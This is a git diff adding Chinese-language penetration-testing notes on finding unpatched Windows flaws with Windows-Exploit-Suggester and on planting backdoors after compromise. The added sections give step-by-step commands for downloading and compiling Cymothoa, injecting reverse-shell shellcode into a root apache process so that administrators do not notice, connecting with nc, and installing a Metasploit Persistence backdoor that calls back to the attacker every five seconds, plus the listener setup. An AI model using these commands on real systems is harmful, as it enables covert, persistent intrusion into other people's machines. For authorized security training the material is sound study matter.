@@ -3257,6 +3257,41 @@ set payloads cmd/unix/reverse
 
 
 
+#### 3、漏洞补丁对比
+
+很多时候我们不知道目标有什么补丁可以利用，这个时候就可以利用脚本获得目标未安装补丁的列表
+
+脚本：https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+- 获得当前最新的漏洞补丁库（脚本目录下运行）
+
+  会在当前目录下生成一个
+
+  ```
+  ./windows-exploit-suggester.py --update
+  ```
+
+- 获得目标安装补丁列表
+
+  获得systeminfo，保存进123.txt文件
+
+  ```
+  systeminfo > 123.txt
+  ```
+
+- 脚本对比出目标系统漏洞
+
+  ```
+  download 目标文件路径/123.txt 本地路径
+  
+  //对比未安装的漏洞补丁
+  ./windows-exploit-suggester.py --database 2021-03-21-mssb.xls --systeminfo win7.txt
+  ```
+
+
+
+
+
 ### 后渗透攻击工作&准备
 
 对成功渗透进的主机，我们可以使用**Metasploit**提供的**Meterpreter**工具，使后续的渗透入侵变得更容易。后期渗透模块有200多个，Meterpreter有以下优势
@@ -3894,67 +3929,133 @@ reload_all
 
 #### 操作系统后门
 
+后门泛指渗透目标，为了维持我们对目标系统的控制权，我们使用Metasploit提供的Persistence等后渗透攻击模块，通过在目标机上安装自启动、永久服务等方式，来长久地控制目标机！
 
 
 
+##### 1、Cymothoa后门
+
+Cymothoa可以将ShellCode注入现有进程（即插进程）的后门工具。可以把ShellCode伪装成常规程序，并可以与被注入的程序（进程）共存，以避免被管理和维护人员怀疑。另外一项优势：即使目标系统的安全防护工具能够监视可执行程序的完整性，只要它不检测内存，就发现不了（插进程）后门程序的进程。
+
+其后门所拥有的权限和注入的进程权限是相同的（并不需要root)。**当拿下目标 shell 后就可以使用Cymothoa添加后门了**当然，因为后门是以运行中的程序为宿主，所以只要进程关闭或者目标主机重启，后门就会停止运行。
+
+首先查看程序的PID
+
+- Linux下：`ps -aux`
+
+  ![image-20210322103113926](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322103113926.png)
+
+- Windows下：`tasklist`
+
+  ![image-20210322103139591](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322103139591.png)
 
 
 
+在使用Cymothoa时，需通过**指定目标进程的PID**和**ShellCode的编号**
+
+| 参数 | 作用                      |
+| ---- | ------------------------- |
+| -p   | 指定目标进程的PID         |
+| -s   | 指定ShellCode的编号       |
+| -y   | 用来指定反向 shell 的端口 |
 
 
 
+实战，拿到shell后
+
+![image-20210322105157992](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322105157992.png)
+
+寻找一个进程，我们过滤出apache的进程，比如这个有root权限的进程
+
+```
+ps -aux | grep apache
+```
+
+![image-20210322105340048](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322105340048.png)
+
+Cymothoa是需要上传到目标机，我们可以先上传到自己的服务器上再下载到目标机器
+
+```
+wget xxx/cymothoa-1-beta.tar.gz		//地址填入合适的
+
+tar xzvf cymothoa-1-beta.tar.gz		//tar进行解压
+
+cd cymothoa-1-beta		//进入目录后编译后直接运行
+cc bgrep.c -o bgrep
+cc udp_server.c -o udp_server
+cc cymothoa.c -o cymothoa -Dlinux_x86
+./cymothoa		
+```
+
+![image-20210322112831197](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322112831197.png)
+
+Cymothoa有很多的后门shellcode，这些shellcode可以通过 - S 参数来查看
+
+```
+./cymothoa -S
+```
+
+![image-20210322112950300](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322112950300.png)
+
+这里我们就用序号 1 这个 payload，通过端口来反向 shell。用到的 cymothoa 参数有一个是 `-p`，用来指定需要注入的进程的 pid，再一个是 `-s`，用来指定使用 shellcode 的序号，再一个就是 `-y`，用来指定反向 shell 的端口，即别人连接自己时需要连接的端口。运行后当出现 infected 即感染的意思则代表后门注入成功。
+
+```
+./cymothoa -p 5188 -s 1 -y 4444
+```
+
+![image-20210322113244921](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322113244921.png)
+
+注入成功后，我们通过攻击机器 kali 来使用 `nc` 连接，使用的 `nvv` 参数，会显示所有的详细信息。
+
+```
+nc -nvv 192.168.163.136 4444
+```
+
+![image-20210322113439416](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322113439416.png)
 
 
 
+##### 2、Persistence后门
+
+Persistence是一款使用安装自启动方式的持久性后门程序，我们可以利用它创建注册和文件。
+
+- 查看用到的所有命令选项
+
+  ```
+  run persistence -h
+  ```
+
+  ![image-20210322123928542](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322123928542.png)
+
+- 创建一个持久性的后门
+
+  ```
+  run persistence -A -S -U -X -i 5 -p 4321 -r 192.168.16.106
+  ```
+
+这样电脑在系统登陆，用户登陆，开机，使用中每个5秒都会回连你的机器
+
+然后我们使用下面的漏洞利用模块和攻击载荷进行监听
+
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST 192.168.16.106	//设置自己的IP和回连的端口
+set LPORT 4321
+```
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+| 参数 | 作用                  |
+| ---- | --------------------- |
+| -A   | 自动启动Payload程序   |
+| -S   | 系统启动时自动加载    |
+| -U   | 用户登录时自动启动    |
+| -X   | 开机时自动加载        |
+| -i   | 回连的时间间隔        |
+| -P   | 监听反向连接端口号    |
+| -r   | 你的接收shell的电脑IP |
 
 
 
